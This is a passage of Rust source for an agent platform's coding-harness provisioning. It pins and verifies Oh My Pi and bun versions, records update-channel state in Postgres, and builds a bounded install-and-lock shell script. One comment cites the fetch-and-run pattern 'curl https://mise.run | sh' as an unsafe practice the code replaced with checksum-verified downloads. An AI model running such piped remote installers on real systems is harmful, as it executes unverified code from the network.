// The workbench's coding harness: Oh My Pi (omp), and only omp. A Developer
// Agent drives it from its sandbox: the persona is the orchestrator, omp is
// the pair programmer. There is no registry to pick from and nothing for an
// admin to configure per agent; this file is the whole definition.
//
// Models are omp's call, not a per-job pin. The org's Workbench roles on
// /models (code-light / code-standard / code-heavy) become omp's own model
// roles (smol / default / slow + plan), so omp moves between them the way it
// is built to (subagents and commits on smol, the advisor on slow, plan mode
// on plan) instead of running a whole job on one model the platform chose.

use serde_json::{Map, Value, json};
use sqlx::PgPool;

/// Oh My Pi, as a start_job answer spells it. `<model>` is the default role's
/// model (the platform fills it, the agent never picks), `<sessionDir>` the
/// job's session dir, and `<task>` stays for the driving agent to fill.
pub struct Harness {
    pub slug: &'static str,
    pub label: &'static str,
    pub invoke: &'static str,
    pub json_invoke: &'static str,
    pub continue_invoke: &'static str,
    pub continue_json_invoke: &'static str,
    /// A cheap command that proves the binary runs in the sandbox, surfaced
    /// by the workbench doctor for agents to self-verify.
    pub probe: &'static str,
    /// One short model call through the harness: proves it can AUTHENTICATE,
    /// which `probe` cannot (`--version` calls no model). `<model>` is the
    /// provider-qualified model; no session, tools, skills or rules load.
    pub auth_probe: &'static str,
    /// What a driving agent should understand: sessions, resume, results.
    pub guide: &'static str,
}

pub const OMP: Harness = Harness {
    slug: "oh-my-pi",
    label: "Oh My Pi",
    invoke: "<launcher> -p --auto-approve --session-dir <sessionDir> --model <model> \"<task>\"",
    json_invoke: "<launcher> --mode json --auto-approve --session-dir <sessionDir> --model <model> \"<task>\"",
    continue_invoke: "<launcher> -p --auto-approve --session-dir <sessionDir> -c --model <model> \"<task>\"",
    continue_json_invoke: "<launcher> --mode json --auto-approve --session-dir <sessionDir> -c --model <model> \"<task>\"",
    probe: "<launcher> --version",
    auth_probe: "<launcher> -p --no-session --no-tools --no-skills --no-rules --no-extensions --no-title --model <model> \"Reply with the single word OK.\"",
    guide: "You are the orchestrator; Oh My Pi (omp) is the pair programmer. Talaria has already cloned the repo, installed its toolchain and Oh My Pi, and checked them: run the lines exactly as given, from any directory (the launcher cds into the workdir and loads the project env). Never install, upgrade, wrap or reconfigure the harness, and never point it at another harness dir. First turn: jsonRun. Later turns: continueJsonRun (`-c`) on the same --session-dir. Run each turn in the BACKGROUND (your terminal's background mode) and wait on the process; a foreground call is cut off at the terminal's timeout and kills omp mid-edit. One scoped ask per turn (a function, a failing test, a review of the last diff), then read the JSON events and steer. Never --no-session, never the TUI, never one-shot the feature. --auto-approve skips tool prompts. omp picks its own models for the work (a fast model for subagents and small steps, a reasoning model for planning and review); do not pass a different --model. Hash-anchored edits, LSP, subagents, and a browser live inside omp; do not reimplement them. Git over https:// just works. After the change is right: git diff, verify, finish_job.",
};

/// The provider omp's models.yml declares; model ids on the command line and
/// in the role env carry it as a prefix.
pub const PROVIDER: &str = "talaria";

/// Where omp keeps config, auth, and sessions. On the department state volume
/// so a session persists and a department-mate can resume it. omp relocates
/// `~/.omp/agent` here when `PI_CODING_AGENT_DIR` is set. Docker creates this
/// directory as root when the render bind-mounts policy files into it; the
/// fleet render's cont-init hook chowns it back to the runtime user.
pub const PI_CODING_AGENT_DIR: &str = "/opt/data/workbench/harness/pi";

/// The bun the coding harness runs on when this instance has verified no
/// other (the BOOTSTRAP FALLBACK — [`Versions::bootstrap`]). omp's executable
/// is a bun program (`#!/usr/bin/env bun`) and exits at start on a bun below
/// its `engines.bun`. This is the harness's runtime, not the repo's toolchain
/// (`mise.toml` decides that). The workbench harness channel
/// (`talaria-workbench-updates`) moves it to bun's newer releases once a
/// candidate has installed and started on a workbench.
pub const HARNESS_BUN: &str = "1.4.4";

/// mise's data dir on a Developer Agent's volume (the render sets
/// `XDG_DATA_HOME` to this, and mise keeps its installs and shims under it).
pub const HARNESS_XDG_DATA_HOME: &str = "/opt/data/workbench/harness/xdg";

/// A directory that is on the agent's PATH in EVERY shell: the Hermes image
/// puts it in the container's own `PATH`, so a plain `bash -c` sees it as well
/// as a login shell. mise's shim directory is not like that — it reaches the
/// PATH only through the profile block prepare_env writes, and only in a login
/// shell — which is how a sandbox could hold an installed bun and still answer
/// `env: 'bun': No such file or directory` when omp started.
pub const AGENT_BIN_DIR: &str = "/opt/data/.local/bin";

/// The Oh My Pi release a job runs when this instance has verified no newer
/// one: the BOOTSTRAP FALLBACK, not a permanent pin. The workbench harness
/// channel (`talaria-workbench-updates`, docs/UPDATES.md) checks npm on a
/// schedule, installs a newer release beside this one on a workbench, smoke-
/// tests it, and only then makes it what new jobs run ([`effective`]). A job
/// never resolves a version itself: it runs what [`effective`] names, installed
/// once per volume, never `@latest` on each run.
///
/// Every invocation line used to be `npx -y @oh-my-pi/pi-coding-agent@latest`,
/// and omp ships almost daily. On 2026-10-28 (18.13.3) its `engines.bun` rose
/// from 1.3.14 to 1.4.4, so whatever bun a sandbox had, the next release could
/// refuse it: `error: Bun runtime must be >= 1.4.4 (found v1.4.0)`. A cold
/// `npx` on a fresh volume could also eat a whole 300 s tool call before omp
/// printed anything. On the live fleet every Developer Agent then spent its
/// first 13 to 75 turns finding a bun that worked and a version that started.
/// This fallback moves only when someone bumps it here and the test against
/// [`HARNESS_BUN`] still passes; the channel moves what jobs run.
///
/// Its transitive dependencies are NOT pinned by a lockfile, on purpose:
/// omp pins every `@oh-my-pi/*` package it ships exactly, and the carets left
/// are third-party (`@opentelemetry/*`, `@babel/parser`), resolved once, when
/// a volume first installs this version — the install is never re-resolved
/// after that, so a job never sees them move under it. A lockfile would have
/// to be regenerated, by the pinned bun, on every bump, and would pin the
/// platform-specific optional packages (`pi-natives-*`) of whatever machine
/// made it.
pub const OMP_VERSION: &str = "18.16.0";

/// [`OMP_VERSION`]'s own `engines.bun`, read off npm for that release: what
/// the harness channel checks a bun move against before any check has read
/// the bootstrap's document.
pub const OMP_VERSION_BUN_RANGE: &str = ">=1.4.4";

/// omp's npm package.
pub const OMP_PACKAGE: &str = "@oh-my-pi/pi-coding-agent";

/// Everything the harness keeps on the department volume.
pub const HARNESS_ROOT: &str = "/opt/data/workbench/harness";

/// Where the omp versions live: `omp/<version>` is a SYMLINK to the real
/// install, `omp/.<version>.<stamp>`, and an install is swapped in by
/// renaming a new symlink over it. A job already running keeps the directory
/// it started from — nothing a job may be running is ever deleted — and a
/// bump installs beside the old version. Old installs no process maps and
/// nothing has touched for two days are pruned.
pub fn omp_root() -> String {
    format!("{HARNESS_ROOT}/omp")
}

/// A version's path (the symlink [`omp_root`] describes).
pub fn omp_install_dir(version: &str) -> String {
    format!("{}/{version}", omp_root())
}

/// omp's own entry point inside [`omp_install_dir`]. The launcher runs it on
/// the harness's bun BY PATH, never through `#!/usr/bin/env bun`: inside a
/// repo that pins its own bun, the `bun` on PATH is that repo's (a mise shim
/// ahead of everything), and Talaria's repo pins 1.4.0, under omp's floor.
pub fn omp_entry(version: &str) -> String {
    format!(
        "{}/node_modules/{OMP_PACKAGE}/dist/cli.js",
        omp_install_dir(version)
    )
}

/// The versions a provision installs and runs: the harness's own bun and the
/// Oh My Pi release. Every script below takes them, so a job's launcher names
/// the exact install it was provisioned on and keeps it until it ends.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Versions {
    pub bun: String,
    pub omp: String,
}

impl Versions {
    /// The compiled fallback ([`HARNESS_BUN`], [`OMP_VERSION`]): what a job
    /// runs when nothing newer has been verified here.
    pub fn bootstrap() -> Versions {
        Versions {
            bun: HARNESS_BUN.into(),
            omp: OMP_VERSION.into(),
        }
    }

    /// Both versions are plain `x.y.z` — the only shape that may reach a
    /// script. Anything else (a range, a tag, a hostile string from a
    /// registry) is refused before it is ever written into one.
    pub fn plain(&self) -> bool {
        plain_version(&self.bun) && plain_version(&self.omp)
    }
}

/// A plain release number: `x.y.z`, digits only, no leading zeros beyond a
/// lone `0`, each part under ten digits.
pub fn plain_version(v: &str) -> bool {
    let parts: Vec<&str> = v.split('.').collect();
    parts.len() == 3
        && parts.iter().all(|p| {
            !p.is_empty()
                && p.len() < 10
                && p.bytes().all(|c| c.is_ascii_digit())
                && (p.len() == 1 || !p.starts_with('0'))
        })
}

/// The `app_settings` key the workbench harness channel keeps its state
/// under (`talaria-workbench-updates` writes it; provisioning reads it).
pub const CHANNEL_STATE_KEY: &str = "workbench_harness_channel";

/// What provisioning installs: the pair the channel last verified on a
/// workbench (`current`), else the bootstrap fallback; and the pair before it
/// (`previous`), which a volume falls back to when the current one will not
/// install there.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Effective {
    pub target: Versions,
    pub fallback: Option<Versions>,
    /// Where `target` came from: `verified` (the channel's) or `bootstrap`.
    pub source: &'static str,
}

/// [`Effective`] from the channel's stored state (`None`, unreadable, or a
/// version that is not plain all read as the bootstrap). Pure.
pub fn effective_from(state: Option<&Value>) -> Effective {
    let pair = |key: &str| -> Option<Versions> {
        let p = state?.get(key)?;
        let v = Versions {
            bun: p.get("bun")?.as_str()?.to_string(),
            omp: p.get("omp")?.as_str()?.to_string(),
        };
        v.plain().then_some(v)
    };
    match pair("current") {
        Some(target) => {
            let fallback = pair("previous").filter(|p| *p != target);
            Effective {
                target,
                fallback,
                source: "verified",
            }
        }
        None => Effective {
            target: Versions::bootstrap(),
            fallback: None,
            source: "bootstrap",
        },
    }
}

/// The stored channel state, `None` when there is none yet. A store that
/// will not answer is an error, never the bootstrap: a job provisioned on a
/// database blip would otherwise run the compiled pair until it ends.
pub async fn channel_state(pg: &PgPool) -> Result<Option<Value>, String> {
    sqlx::query_scalar("select value from app_settings where key = $1")
        .bind(CHANNEL_STATE_KEY)
        .fetch_optional(pg)
        .await
        .map_err(|e| format!("the workbench harness state could not be read: {e}"))
}

/// What a provision on this instance installs now. Never a registry call:
/// a job runs only what the channel verified, or the bootstrap fallback.
pub async fn effective(pg: &PgPool) -> Result<Effective, String> {
    Ok(effective_from(channel_state(pg).await?.as_ref()))
}

impl Effective {
    /// The Oh My Pi releases whose installs a provision keeps: the target's
    /// and the fallback's.
    pub fn keep(&self) -> Vec<String> {
        let mut k = vec![self.target.omp.clone()];
        if let Some(f) = &self.fallback
            && !k.contains(&f.omp)
        {
            k.push(f.omp.clone());
        }
        k
    }
}

/// The pairs a provision on `department`'s volume tries, in order: the
/// verified pair — unless this volume already refused it, then it is skipped
/// and the sentence says why — then the previous verified pair, then the
/// compiled bootstrap as the last resort. Pure.
pub fn attempts_from(state: Option<&Value>, department: &str) -> (Vec<Versions>, Option<String>) {
    let eff = effective_from(state);
    let refused = state
        .and_then(|s| s.get("volumes"))
        .and_then(|v| v.get(department))
        .and_then(|v| {
            let r = v.get("refused")?;
            let pair = Versions {
                bun: r.get("bun")?.as_str()?.to_string(),
                omp: r.get("omp")?.as_str()?.to_string(),
            };
            let why = v
                .get("error")
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string();
            Some((pair, why))
        });
    let mut out: Vec<Versions> = Vec::new();
    let mut skipped = None;
    match &refused {
        Some((pair, why)) if *pair == eff.target && eff.source == "verified" => {
            skipped = Some(format!(
                "this workbench would not take Oh My Pi {} on bun {} ({}), so it is not tried again until the channel's next try on it succeeds",
                pair.omp,
                pair.bun,
                why.lines().next().unwrap_or("no reason recorded")
            ));
        }
        _ => out.push(eff.target.clone()),
    }
    for v in eff.fallback.into_iter().chain([Versions::bootstrap()]) {
        if !out.contains(&v) && !(skipped.is_some() && v == eff.target) {
            out.push(v);
        }
    }
    (out, skipped)
}

/// Record that `department`'s volume would not take `v` (the release's own
/// failure there, not the host's): its next provisions go straight to the
/// fallback, and the channel tries it again on its own schedule. One UPDATE,
/// so it waits behind the channel's own row lock and loses nothing.
pub async fn record_refusal(pg: &PgPool, department: &str, v: &Versions, why: &str) {
    let why: String = why.chars().take(1500).collect();
    let r = sqlx::query(
        "insert into app_settings (key, value) values ($1, '{}'::jsonb) on conflict (key) do nothing",
    )
    .bind(CHANNEL_STATE_KEY)
    .execute(pg)
    .await;
    if let Err(e) = r {
        tracing::warn!("[workbench] the refusal on {department} could not be recorded: {e}");
        return;
    }
    let r = sqlx::query(
        "update app_settings set value = \
           case when jsonb_typeof(value) = 'object' then value else '{}'::jsonb end \
           || jsonb_build_object('volumes', \
                coalesce(case when jsonb_typeof(value) = 'object' then value->'volumes' end, '{}'::jsonb) \
                || jsonb_build_object($2::text, \
                     coalesce(value->'volumes'->$2::text, '{}'::jsonb) \
                     || jsonb_build_object('refused', jsonb_build_object('bun', $3::text, 'omp', $4::text, 'at', $6::bigint), \
                                           'error', $5::text, 'at', $6::bigint))), \
           updated_at = now() \
         where key = $1",
    )
    .bind(CHANNEL_STATE_KEY)
    .bind(department)
    .bind(&v.bun)
    .bind(&v.omp)
    .bind(&why)
    .bind(now_ms())
    .execute(pg)
    .await;
    if let Err(e) = r {
        tracing::warn!("[workbench] the refusal on {department} could not be recorded: {e}");
    }
}

fn now_ms() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// The `app_settings` key prefix the verified lockfiles live under: one per
/// verified PAIR (a lockfile is bun's own format, and an older bun refuses a
/// newer bun's — `UnknownLockfileVersion`), written when the pair passes its
/// smoke test, read by every provision of it.
pub const LOCK_KEY_PREFIX: &str = "workbench_harness_lock:";

/// The key of `v`'s verified lockfile.
pub fn lock_key(v: &Versions) -> String {
    format!("{LOCK_KEY_PREFIX}{}+{}", v.bun, v.omp)
}

/// A release's verified lockfile, and npm's integrity for its tarball.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerifiedLock {
    pub lock: String,
    pub integrity: Option<String>,
}

/// `v`'s verified lockfile, if a smoke test has kept one.
pub async fn verified_lock(pg: &PgPool, v: &Versions) -> Result<Option<VerifiedLock>, String> {
    let row: Option<Value> = sqlx::query_scalar("select value from app_settings where key = $1")
        .bind(lock_key(v))
        .fetch_optional(pg)
        .await
        .map_err(|e| {
            format!(
                "the verified lockfile for Oh My Pi {} on bun {} could not be read: {e}",
                v.omp, v.bun
            )
        })?;
    Ok(row
        .and_then(|v| {
            Some(VerifiedLock {
                lock: v.get("lock")?.as_str()?.to_string(),
                integrity: v
                    .get("integrity")
                    .and_then(Value::as_str)
                    .filter(|i| plain_integrity(i))
                    .map(str::to_string),
            })
        })
        .filter(|l| !l.lock.trim().is_empty()))
}

/// One harness directory per job, beside nothing another job uses.
///
/// `PI_CODING_AGENT_DIR` used to be ONE directory for every job on the agent
/// (`/opt/data/workbench/harness/pi`). omp keeps SQLite databases there
/// (`agent.db`, `models.db`, `history.db`), and a Developer Agent runs several
/// jobs at once. Live, each job's agent made its own private copy of it
/// (`pi-mirror`, `pi-t92`, `pi-t83`) and the next job borrowed whichever copy
/// it found — TALA-93 ran on the dir made for TALA-92.
pub const JOB_HARNESS_ROOT: &str = "/opt/data/workbench/harness/jobs";

/// Is `name` a harness slot: a job uuid (hyphenated, lowercase hex),
/// doctor's own [`DOCTOR_SLOT`] or the channel's [`UPDATE_SLOT`]? Everything that builds a slot path goes
/// through this, because teardown hands the path to `rm -rf`.
pub fn valid_slot(name: &str) -> bool {
    if name == DOCTOR_SLOT || name == UPDATE_SLOT {
        return true;
    }
    let b = name.as_bytes();
    b.len() == 36
        && b.iter().enumerate().all(|(i, c)| match i {
            8 | 13 | 18 | 23 => *c == b'-',
            _ => c.is_ascii_digit() || (b'a'..=b'f').contains(c),
        })
}

/// A job's harness directory, for a [`valid_slot`] `name` — `None` for
/// anything else.
pub fn job_harness_dir(name: &str) -> Option<String> {
    valid_slot(name).then(|| format!("{JOB_HARNESS_ROOT}/{name}"))
}

/// The job's `PI_CODING_AGENT_DIR`: omp's config, auth and databases.
pub fn job_agent_dir(name: &str) -> Option<String> {
    job_harness_dir(name).map(|d| format!("{d}/agent"))
}

/// The job's launcher: the one command every invocation line starts with.
pub fn job_launcher(name: &str) -> Option<String> {
    job_harness_dir(name).map(|d| format!("{d}/omp"))
}

/// The harness's slot in [`job_harness_dir`] that doctor probes through.
pub const DOCTOR_SLOT: &str = "doctor";

/// The slot the harness channel smoke-tests a candidate through: the same
/// layout and launcher a job gets, standing in the workbench root, so a
/// candidate passes only if a job's launcher would start it.
pub const UPDATE_SLOT: &str = "update-check";

/// Where the render leaves the files omp reads, live: a DIRECTORY bind of the
/// agent's workbench render dir, so a re-render reaches a running container.
/// A job's agent dir links to these rather than copying them.
pub const WORKBENCH_CONFIG_DIR: &str = "/opt/workbench-config";

/// The pinned mise every workbench installs when its volume has none: the
/// release binary from GitHub, by version, checked against its published
/// SHA-256 (`SHASUMS256.txt` of that release) before it is ever run. Never
/// `curl https://mise.run | sh`, which ran whatever the installer and the
/// latest release were at that moment.
pub const MISE_VERSION: &str = "2026.10.19";
/// `mise-v<MISE_VERSION>-linux-x64-musl`'s SHA-256.
pub const MISE_SHA256_X64: &str =
    "45fa1d94af35d5c65df7176612d5b3f61f9e406d47e8eb28e5032e2a0b99b563";
/// `mise-v<MISE_VERSION>-linux-arm64-musl`'s SHA-256.
pub const MISE_SHA256_ARM64: &str =
    "35cbcd510247f9bde9baee667bd0b394a3d78a54078645f40c028a43c4794baa";

/// A shell function, `install_mise <dest>`: the pinned mise, downloaded,
/// checksum-verified and moved into place whole. Shared by the harness's
/// runtime script and prepare_env's.
pub fn install_mise_sh(download_secs: u64) -> String {
    r#"install_mise() {
  dest="$1"
  case "$(uname -m)" in
    x86_64|amd64) arch=x64; sum=__X64__ ;;
    aarch64|arm64) arch=arm64; sum=__ARM64__ ;;
    *) echo "there is no pinned mise for $(uname -m)" >&2; return 1 ;;
  esac
  mkdir -p "$(dirname "$dest")"
  tmp="$dest.dl.$$"
  if ! curl -fsSL --max-time __DL__ -o "$tmp" "https://github.com/jdx/mise/releases/download/v__V__/mise-v__V__-linux-$arch-musl" 9>&-; then
    rm -f "$tmp"; echo "could not download mise __V__ from GitHub" >&2; return 1
  fi
  got="$(sha256sum "$tmp" 2>/dev/null | cut -d' ' -f1)"
  if [ "$got" != "$sum" ]; then
    rm -f "$tmp"; echo "mise __V__ failed its checksum (sha256 ${got:-unreadable}, not $sum)" >&2; return 1
  fi
  chmod 0755 "$tmp" && mv -f "$tmp" "$dest"
}
"#
    .replace("__X64__", MISE_SHA256_X64)
    .replace("__ARM64__", MISE_SHA256_ARM64)
    .replace("__V__", MISE_VERSION)
    .replace("__DL__", &download_secs.to_string())
}

/// How long each step of the runtime script may take. Every step that runs a
/// release's code or downloads it is bounded by `timeout`, so a release that
/// hangs (a start that waits on a TTY or the network) is reported as the
/// release's and never holds the volume's install lock: the lock's fd is
/// closed for every child, and `timeout` kills the step's whole process
/// group. The sum, plus the lock wait, stays under [`RUNTIME_EXEC_SECS`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Bounds {
    /// One `--version` start (bun's or Oh My Pi's).
    pub start_secs: u64,
    /// `bun install` of Oh My Pi.
    pub install_secs: u64,
    /// mise's own download, and `mise install bun@<v>`.
    pub mise_secs: u64,
    /// Waiting for another provision's install lock.
    pub lock_wait_secs: u64,
}

/// The bounds every workbench runs under.
pub const BOUNDS: Bounds = Bounds {
    start_secs: 60,
    install_secs: 240,
    mise_secs: 180,
    lock_wait_secs: INSTALL_LOCK_WAIT_SECS,
};

/// The exec limit for one run of the runtime script: the lock wait, mise and
/// its bun, the install and three starts, with room. The script itself runs
/// under an in-container `timeout` [`RUNTIME_INNER_SLACK_SECS`] shorter, so
/// the container kills its own process tree before the client gives up.
pub const RUNTIME_EXEC_SECS: u64 = 18 * 60;
/// How much sooner the in-container bound fires than the client's.
pub const RUNTIME_INNER_SLACK_SECS: u64 = 30;

/// The last argument of the runtime script's shell, so a run the exec limit
/// overtook can be found in the container and its process group killed.
pub const RUNTIME_MARKER: &str = "talaria-harness-runtime";

/// The argv that runs a script in the container under the in-container
/// bound: `sh -c <this> sh <secs> <script>`. Falls back to running it
/// unbounded where the image has no `timeout`.
pub const BOUNDED_EXEC_SH: &str = r#"if command -v timeout >/dev/null 2>&1; then exec timeout -k 10 "$1" sh -c "$2" talaria-harness-runtime; else exec sh -c "$2" talaria-harness-runtime; fi"#;

/// Kill whatever is left of a runtime-script run (its process group), found
/// by [`RUNTIME_MARKER`]: what the client runs when its own limit hit, so a
/// run the in-container bound missed never keeps going on its own.
pub const KILL_RUNTIME_SH: &str = r#"for p in /proc/[0-9]*; do
  last="$(tr '\0' '\n' < "$p/cmdline" 2>/dev/null | tail -n 1)"
  [ "$last" = talaria-harness-runtime ] || continue
  g="$(sed 's/^.*) //' "$p/stat" 2>/dev/null | cut -d' ' -f3)"
  [ -n "$g" ] && kill -KILL -- "-$g" 2>/dev/null
  kill -KILL "${p#/proc/}" 2>/dev/null
done
true"#;

/// Whose failure a runtime-script run was, as the script says it on its last
/// stderr line (`talaria-fault: <phase>`): `start` (the release installed and
/// would not start, or did not start in time), `timeout` (its install did not
/// finish in time), `install` (the install failed: the caller reads the log
/// to tell a missing release from a network error), `host` (mise's own
/// download, the install lock, a disk).
pub fn runtime_fault_phase(err: &str) -> Option<&str> {
    err.lines()
        .rev()
        .find_map(|l| l.trim().strip_prefix("talaria-fault: "))
        .map(str::trim)
}

/// One run of the runtime script.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuntimeRun<'a> {
    /// What to install and start.
    pub v: &'a Versions,
    /// The harness channel's smoke test: bun and Oh My Pi are installed and
    /// started by their own versioned paths, and the volume's shell `bun`
    /// (`mise use -g`, the [`AGENT_BIN_DIR`] link) is left as it is. A
    /// provision of a verified pair promotes its bun there, once it started.
    pub smoke: bool,
    /// Oh My Pi releases whose installs the prune never removes: the
    /// channel's current and fallback.
    pub keep: &'a [String],
    /// A lockfile (`bun.lock`) arrives on stdin: install with
    /// `--frozen-lockfile`, and reinstall an install whose lock differs, so
    /// every transitive dependency is exactly what was smoke-tested.
    pub frozen: bool,
    /// npm's `dist.integrity` for the Oh My Pi tarball: the lockfile an
    /// unfrozen install writes must name it, or the install is refused.
    pub integrity: Option<&'a str>,
    /// The npm registry `bun install` resolves from (a mirror), when the
    /// operator set one for the check too.
    pub registry: Option<&'a str>,
}

impl<'a> RuntimeRun<'a> {
    /// A provision of `v`, no lockfile, nothing else kept.
    pub fn provision(v: &'a Versions) -> RuntimeRun<'a> {
        RuntimeRun {
            v,
            smoke: false,
            keep: &[],
            frozen: false,
            integrity: None,
            registry: None,
        }
    }
}

/// npm's `dist.integrity` as it may reach a script.
pub fn plain_integrity(s: &str) -> bool {
    let Some((algo, b64)) = s.split_once('-') else {
        return false;
    };
    ["sha1", "sha256", "sha384", "sha512"].contains(&algo)
        && !b64.is_empty()
        && b64.len() < 200
        && b64
            .bytes()
            .all(|c| c.is_ascii_alphanumeric() || b"+/=".contains(&c))
}

/// A registry URL as it may reach a script.
pub fn plain_registry(s: &str) -> bool {
    (s.starts_with("https://") || s.starts_with("http://"))
        && s.len() < 300
        && s.bytes()
            .all(|c| c.is_ascii_alphanumeric() || b":/._-%@".contains(&c))
}

/// Make the harness's runtime real in a sandbox, idempotently, as the agent's
/// own user: the pinned mise if the volume has none yet, bun installed by
/// version, and Oh My Pi installed into [`omp_install_dir`] and started once.
/// A provision then pins that bun globally and links it into [`AGENT_BIN_DIR`]
/// so every shell finds it — only after it and Oh My Pi started. Prints
/// `bun <v>`, `omp <v>` and `bunPath <path>` on success ([`parse_runtime`]);
/// exits non-zero with the reason, and a `talaria-fault:` line, otherwise.
/// Cheap once done (no download, one `--version` each).
///
/// The platform runs this before it hands the agent a harness to use — doctor,
/// start_job's provisioning, prepare_env — rather than trusting that some
/// earlier step put bun there. Before this, bun appeared only after a
/// prepare_env on a cloned repo, so a fresh Developer Agent's doctor, and every
/// non-login shell, found no bun and omp could not start.
///
/// `run.v` is what to install and start: what the channel verified for a
/// provision, a candidate for the harness channel's smoke test. Never a range
/// or a tag (`None` unless the versions, integrity and registry are plain).
pub fn harness_runtime_script(run: &RuntimeRun) -> Option<String> {
    runtime_script_checked(
        HARNESS_XDG_DATA_HOME,
        AGENT_BIN_DIR,
        HARNESS_ROOT,
        run,
        &BOUNDS,
    )
}

fn runtime_script_checked(
    xdg: &str,
    bin: &str,
    harness_root: &str,
    run: &RuntimeRun,
    b: &Bounds,
) -> Option<String> {
    let ok = run.v.plain()
        && run.keep.iter().all(|k| plain_version(k))
        && run.integrity.is_none_or(plain_integrity)
        && run.registry.is_none_or(plain_registry);
    ok.then(|| runtime_script_for(xdg, bin, harness_root, run, b))
}

/// [`harness_runtime_script`] against other roots — the script the tests run
/// for real, under a temp dir, with a stand-in bun.
fn runtime_script_for(
    xdg: &str,
    bin: &str,
    harness_root: &str,
    run: &RuntimeRun,
    b: &Bounds,
) -> String {
    let v = run.v;
    let root = format!("{harness_root}/omp");
    let link = format!("{root}/{}", v.omp);
    let entry = format!("{link}/node_modules/{OMP_PACKAGE}/dist/cli.js");
    let script = r#"set -eu
export XDG_DATA_HOME="__XDG__" MISE_YES=1
bin="__BIN__"
mise="$bin/mise"
root="__OMPROOT__"
link="__OMPDIR__"
entry="__ENTRY__"
smoke=__SMOKE__
frozen=__FROZEN__
mkdir -p "$bin" "$root"
# Every step that runs a release's code or downloads it is bounded, and runs
# with the install lock's fd (9) closed: a step that hangs is the release's
# to answer for, and nothing it leaves behind can keep the lock.
if command -v timeout >/dev/null 2>&1; then
  bounded() { s="$1"; shift; timeout -k 5 "$s" "$@"; }
else
  bounded() { shift; "$@"; }
fi
# The last line the api reads: whose failure this was.
fault() { echo "talaria-fault: $1" >&2; exit 1; }
lockin=""
lockdir=""
cleanup() {
  if [ -n "$lockin" ]; then rm -f "$lockin"; fi
  if [ -n "$lockdir" ]; then rm -rf "$lockdir"; fi
}
trap cleanup EXIT
if [ "$frozen" = 1 ]; then
  lockin="$root/.lock.in.$$"
  cat > "$lockin"
  [ -s "$lockin" ] || { echo "the verified lockfile arrived empty" >&2; fault host; }
fi
__INSTALL_MISE__
# The harness's bun, by its own versioned path: resolved once and asked for
# its own version, so another provision repointing the shell's `bun` link
# meanwhile changes nothing here.
real="__XDG__/mise/installs/bun/__BUN__/bin/bun"
if ! { [ -x "$real" ] && [ "$(bounded __TSTART__ "$real" --version 2>/dev/null </dev/null 9>&-)" = "__BUN__" ]; }; then
  if [ ! -x "$mise" ]; then
    install_mise "$mise" || { echo "could not install mise (the toolchain manager bun is installed with) into $bin" >&2; fault host; }
  fi
  rc=0
  out="$(bounded __TMISE__ "$mise" install bun@__BUN__ 2>&1 </dev/null 9>&-)" || rc=$?
  if [ "$rc" != 0 ]; then
    echo "could not install bun __BUN__ with mise (exit $rc): $(printf '%s' "$out" | tail -n 4)" >&2
    case "$rc" in 124|137) echo "bun __BUN__ did not finish installing within __TMISE__ s" >&2; fault timeout ;; esac
    fault install
  fi
  real="$("$mise" where bun@__BUN__ 2>/dev/null </dev/null)/bin/bun"
  [ -x "$real" ] || { echo "bun __BUN__ is not at $real after installing it" >&2; fault host; }
  rc=0
  said="$(bounded __TSTART__ "$real" --version 2>&1 </dev/null 9>&-)" || rc=$?
  if [ "$said" != "__BUN__" ]; then
    case "$rc" in 124|137) echo "bun __BUN__ did not finish starting within __TSTART__ s" >&2 ;;
      *) echo "bun __BUN__ installed but does not start: $(printf '%s' "$said" | tail -n 3)" >&2 ;; esac
    fault start
  fi
fi
# One start of an Oh My Pi entry on that bun: `said` and `rc` say how it went.
start_check() {
  rc=0
  said="$(bounded __TSTART__ "$real" "$1" --version 2>&1 </dev/null 9>&-)" || rc=$?
  [ "$rc" = 0 ] && printf '%s\n' "$said" | grep -qx "omp/__OMPV__"
}
# The install there is the one wanted: it starts, it has the lockfile its
# tree was installed from (one made before lockfiles were kept has none, and
# is installed again once), and (frozen) that lockfile is exactly the
# verified one.
current_ok() {
  start_check "$entry" || return 1
  [ -s "$link/bun.lock" ] || return 1
  [ "$frozen" != 1 ] || cmp -s "$lockin" "$link/bun.lock"
}
if ! current_ok; then
  # One install at a time per volume, and NEVER without the lock: a second
  # provision waits here, then finds the first one's install and skips its
  # own. The wait is shorter than the exec's own timeout, so a waiter fails
  # with this sentence rather than being killed mid-wait.
  lock="$root/.install.lock"
  if command -v flock >/dev/null 2>&1; then
    exec 9>"$lock"
    if ! flock -w __LOCKWAIT__ 9; then
      echo "another provision held the Oh My Pi install lock for __LOCKWAIT__ s; provisioning again takes it once that install is done" >&2
      fault host
    fi
  else
    # No flock: a lock DIRECTORY, made whole and renamed into place, so it is
    # never seen without its holder's pid and token. A dead holder's lock is
    # reclaimed by renaming it away and checking its token is the one read
    # (two waiters reclaiming the same lock: one rename wins, and a waiter
    # whose read went stale puts back what it moved). A lock with no pid —
    # left by an older script — is reclaimed once it is __LOCKSTALE__ s old.
    waited=0
    mine="$lock.d.$$"
    while :; do
      rm -rf "$mine"
      mkdir "$mine"
      echo $$ > "$mine/pid"
      head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n' > "$mine/token"
      if mv -T "$mine" "$lock.d" 2>/dev/null; then
        lockdir="$lock.d"
        break
      fi
      holder=$(cat "$lock.d/pid" 2>/dev/null || true)
      token=$(cat "$lock.d/token" 2>/dev/null || true)
      stale=""
      if [ -n "$holder" ] && ! kill -0 "$holder" 2>/dev/null; then
        stale=1
      elif [ -z "$holder" ] && [ -n "$(find "$lock.d" -maxdepth 0 -mmin +$((__LOCKSTALE__ / 60)) 2>/dev/null)" ]; then
        stale=1
      fi
      if [ -n "$stale" ] && mv -T "$lock.d" "$lock.d.reclaim.$$" 2>/dev/null; then
        if [ "$(cat "$lock.d.reclaim.$$/token" 2>/dev/null || true)" = "$token" ]; then
          rm -rf "$lock.d.reclaim.$$"
        else
          mv -T "$lock.d.reclaim.$$" "$lock.d" 2>/dev/null || rm -rf "$lock.d.reclaim.$$"
        fi
